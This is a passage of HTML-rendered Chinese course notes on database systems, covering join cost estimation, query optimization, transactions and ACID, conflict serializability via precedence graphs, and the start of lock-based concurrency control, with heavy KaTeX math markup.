style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">))</span></span></span></span></eq>,m1为满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">C1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">1</span></span></span></span></eq>的个数，m2为满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">C2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">2</span></span></span></span></eq>的个数，R有n个元组</li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BF%9E%E6%8E%A5%E8%BF%90%E7%AE%97%E7%9A%84%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">（3）连接运算的代价估算</h4><p>估计连接运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mi>R</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mi>N</mi><mi>a</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>a</mi><mi>l</mi><mi>J</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>S</mi><mo stretchy="false">(</mo><mi>Y</mi><mo separator="true">,</mo><mi>Z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=R(X,Y) Natural Join S(Y,Z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mord mathnormal">o</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span></span></eq>的大小</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">(</mo><mi>S</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">T(S)=\frac{T(R)T(S)}{max(V(R,Y),V(S,Y))}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">))</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mclose mtight">)</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq></li></ul><h3 id="2108-%E5%9B%9E%E9%A1%BE" tabindex="-1">2108 回顾</h3><p>以往关系型数据库被认为是不可能的，因为连接会产生巨大的中间数据，但在查询优化后，中间数据变得可以接受，使得关系型数据库成为了现实。</p><ul><li>查询优化<ul><li>逻辑层优化<ul><li>关系代数操作次序优化</li></ul></li><li>物理层优化<ul><li>代价估算</li><li>算法选择和装配次序</li></ul></li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6-%E5%8F%8A-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%8D%E8%AE%BA%E4%BA%8B%E5%8A%A1%E7%AE%A1%E7%90%86" tabindex="-1">第七章 并发控制 及 第八章 再论事务管理</h2><h3 id="2201-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6" tabindex="-1">2201 为什么要进行并发控制</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E4%B8%8D%E4%B8%80%E8%87%B4" tabindex="-1">（1）数据库可能存在不一致</h4><ul><li>三种典型不一致<ul><li>丢失修改</li><li>不能重复读</li><li>脏读</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E7%9A%84%E7%BC%98%E7%94%B1" tabindex="-1">（2）并发控制的缘由</h4><pre><code class="language-mermaid">graph LRA(DB共享)--&gt;B(多应用程序使用);B--&gt;C(可能同时使用);C--&gt;D(数据的不一致性);D--&gt;E(不一致性的类型);E--&gt;F(并发控制);F--&gt;G(并发控制方法);</code></pre><h4 id="%EF%BC%883%EF%BC%89%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF%E6%98%AFdbms%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF" tabindex="-1">（3）并发控制及相应的事务处理技术是DBMS的核心技术</h4><p>核心概念：事务，并发控制，封锁</p><h3 id="2202-%E6%B7%B1%E5%85%A5%E8%AE%A4%E8%AF%86%E4%BA%8B%E5%8A%A1" tabindex="-1">2202 深入认识事务</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">（1）事务的概念</h4><ul><li>事务（Transaction）<br>事务是数据库管理系统提供的控制数据操作的一种手段，通过这一手段，应用程序员将一系列的数据库操作组合在一起作为一个整体进行操作和控制，以便数据库管理系统能够提供一致性状态转换的保证。</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%AE%8F%E8%A7%82%E6%80%A7%E5%92%8C%E5%BE%AE%E8%A7%82%E6%80%A7" tabindex="-1">（2）事务的宏观性和微观性</h4><h5 id="%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%AE%8F%E8%A7%82%E6%80%A7%EF%BC%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9C%8B%E5%88%B0%E7%9A%84%E4%BA%8B%E5%8A%A1%EF%BC%89" tabindex="-1">事务的宏观性（应用程序员看到的事务）</h5><ul><li>一个存取或改变数据库内容的一次执行，或者说一条或多条SQL语句的一次执行被看作一个事务</li><li>事务一般是由应用程序员提出，因此有开始和结束，结束前需要提交或撤销</li><li>一个事务可以处理一个数据或一条记录</li><li>复杂的事务可以处理一批数据或一批记录</li><li>一段程序语言，可能会循环执行，执行中，由SQL语句引出事务，直到事务结束，每次循环都将产生一个事务</li></ul><h5 id="%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%BE%AE%E8%A7%82%E6%80%A7%EF%BC%88dbms%E7%9C%8B%E5%88%B0%E7%9A%84%E4%BA%8B%E5%8A%A1%EF%BC%89" tabindex="-1">事务的微观性（DBMS看到的事务）</h5><ul><li>对数据库的一系列基本操作（读，写）的一个整体性执行</li><li>事物的并发执行：多个事务在宏观上看是并发执行，但其在微观上的基本操作则可以是交叉执行的</li></ul><h4 id="%EF%BC%883%EF%BC%89%E4%BA%8B%E5%8A%A1%E7%9A%84%E7%89%B9%E6%80%A7" tabindex="-1">（3）事务的特性</h4><ul><li><p>宏观独立性</p></li><li><p>微观交错执行</p></li><li><p>并发控制就是通过事务微观交错执行次序的正确安排，保证事务宏观的独立性，完整性和正确性</p></li><li><p>事务的特性 ACID</p><ul><li>原子性（Atomicity）:DBMS能够保证事务的一组更新操作是原子不可分的，即对DB而言，要么全做，要么不做</li><li>一致性（Consistency）:DBMS保证事务的操作状态是正确的，符合一致性的操作规则，不能出现三种典型的不一致性。它是进一步由隔离性来保证的。</li><li>隔离性（Isolation）:DBMS保证并发执行的多个事务之间互相不受影响。例如两个事务T1，T2，既是并发执行，也相当于依次执行</li><li>持久性（Durablity）:DBMS保证已提交的事务影响是持久的，被撤销事务的影响是可以恢复的</li></ul></li><li><p>具有ACID特性的若干数据库基本操作的组合体称为事务</p></li></ul><h4 id="%EF%BC%884%EF%BC%89dbms%E5%AF%B9%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%8E%A7%E5%88%B6" tabindex="-1">（4）DBMS对事务的控制</h4><img src="/images/本科/DBMS对事务的控制.jpg"><h3 id="2203-%E4%BA%8B%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%9A%84%E5%8F%AF%E4%B8%B2%E8%A1%8C%E6%80%A7" tabindex="-1">2203 事务调度的可串行性</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">（1）基本概念</h4><ul><li>事务调度：一组事务的基本步（读，写，其它控制操作比如加锁，解锁等）的一种执行顺序称为对这组事务的一个调度。<br>并发调度：多个事务从宏观上看是并发执行的，但是其微观上的基本操作(读写)则是交叉执行的。</li><li>并发调度的正确性：当且仅当在这个并发调度下所得到的新数据库结果与分别串行地运行这些事务所得到地新数据库完全一直，则说调度是正确的。</li><li>可串行性：如果不管数据库初始状态如何，一个调度对数据库状态的影响都和某个串行调度相同，则我们说这个调度是可串行化的或者说可序列化的。</li><li>可串行化调度一定是正确地并行调度，但正确的并行调度，却未必第一事故可串行化的调度</li><li>并行调度的正确性是指内容上的结果正确性，而可串行性是指形式上结果正确性</li><li>可串行化的等效串行序列不一定唯一</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%80%E7%A7%8D%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%9A%84%E6%A0%87%E8%AE%B0%E6%A8%A1%E5%9E%8B" tabindex="-1">（2）一种简单的事务调度的标记模型</h4><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">r_T(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务T读A. <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">w_T(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务T写A</p><h4 id="%EF%BC%883%EF%BC%89%E5%86%B2%E7%AA%81%E7%9A%84%E4%B8%B2%E8%A1%8C%E6%80%A7" tabindex="-1">（3）冲突的串行性</h4><ul><li>冲突：调度中的一对连续的动作，他们满足：如果它们的顺序交换，那么涉及的事务中至少有一个事务的行为会改变</li><li>有冲突的两个操作是不能交换次序的，没有冲突的两个事务是可交换的</li><li>几种冲突情况<ul><li>同一事务的任何两个操作都是冲突的</li><li>不同事务对同一元素的两个写操作是冲突的</li><li>不同事务对同意元素的一读一写操作是冲突的</li></ul></li><li>冲突可串行性：一个调度，如果通过交换两个相邻的无冲突的操作能够转换到某一个串行的调度，则称此调度为冲突可串行化的调度。</li><li>冲突可串行化是比 可串行化更严格的概念</li><li>满足冲突可串行化，一定满足可串行性</li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%86%B2%E7%AA%81%E5%8F%AF%E4%B8%B2%E8%A1%8C%E6%80%A7%E5%88%A4%E5%88%AB%E7%AE%97%E6%B3%95" tabindex="-1">（4）冲突可串行性判别算法</h4><h5 id="%EF%BC%881%EF%BC%89%E9%97%AE%E9%A2%98" tabindex="-1">（1）问题</h5><ul><li><p>并发调度的正确性：当且仅当在这个并发调度下所得到的新数据库结果与分别串行地运行这些事务所得到的新数据库完全一致，则说调度是正确的</p></li><li><p>问题1：怎样判断一个并发调度是正确的</p><ul><li>解决：通过判断是否为冲突可串行性</li></ul></li><li><p>问题2：怎样产生一个正确的并发调度</p></li></ul><h5 id="%EF%BC%882%EF%BC%89%E7%AE%97%E6%B3%95%E8%A1%A8%E8%BE%BE" tabindex="-1">（2）算法表达</h5><ul><li>构造一个前驱图（有向图）</li><li>节点是每一个事务<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的一个操作与<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>的一个操作发生冲突，且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>前执行，则绘制一条边，由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>指向<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>，表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>要在前<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>执行</li><li>测试检查：如果该有向图没有环，则是冲突可串行化的</li></ul><h3 id="2204-%E5%9F%BA%E4%BA%8E%E5%B0%81%E9%94%81%E7%9A%84%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95" tabindex="-1">2204 基于封锁的并发控制方法</h3><h4 id="%EF%BC%881%EF%BC%89-%E9%97%AE%E9%A2%98" tabindex="-1">（1） 问题</h4><ul><li>怎样产生一个冲突可串行化的调度<ul><li>基于封锁的并发控制</li><li>基于时间戳的并发控制</li><li>基于有效性确认的并发控制</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9C%E9%94%81%E2%80%9D" tabindex="-1">（2）什么是“锁”</h4><ul><li>“锁”是控制并发的一种手段<ul><li>每一数据元素都有一个唯一的锁</li><li>每一事务读写数据元素前，要获取锁</li><li>如果被其他食物持有该元素的锁，则要等待</li><li>事务处理完成后要释放锁</li></ul></li></ul><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">L_i(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>对数据元素<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>加锁<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">U_i(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 